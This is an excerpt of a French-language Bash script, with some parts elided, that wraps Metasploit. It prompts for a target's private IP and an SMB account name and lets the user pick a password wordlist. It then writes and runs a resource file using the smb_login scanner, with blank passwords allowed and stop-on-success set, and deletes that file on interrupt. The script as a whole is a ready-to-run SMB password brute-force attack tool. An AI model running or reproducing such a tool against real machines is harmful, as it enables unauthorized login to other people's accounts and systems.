...
ctrl_c() {
echo -e "
$RED$BOLD [-]$DEFAULT$CYAN Suppression des fichiers de configuration.$DEFAULT"
rm $path/../logs/smb_user
...
echo -e -n "$MAGENTA [>]$CYAN Entrez l'IP privée de l'ordinateur à attaquer : $DEFAULT"
read cible

echo -e -n "$MAGENTA [>]$CYAN Entrez le nom de la session à attaquer : $DEFAULT"
read sessionName

wordlist=$(zenity --title "Choisissez la wordlist à utiliser" --filename=$path --file-selection) > /dev/null 2>&1

echo -e "
$BLUE [...]$DEFAULT$CYAN Création du fichier de configuration de l'expoitation de la faille... $DEFAULT
"

echo "use auxiliary/scanner/smb/smb_login
set rhosts $cible
set smbuser $sessionName
set pass_file $wordlist
set blank_passwords true
set stop_on_success true
exploit
exit" > $path/../logs/smb_user
...
echo -e "$BLUE [...]$DEFAULT$CYAN Démarrage du service postgresql.$DEFAULT
"
service postgresql start

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Lancement de l'exploit : $DEFAULT
"

msfconsole -q -r $path/../logs/smb_user | grep -e "[*]" -e "[+]" -e "[-]"
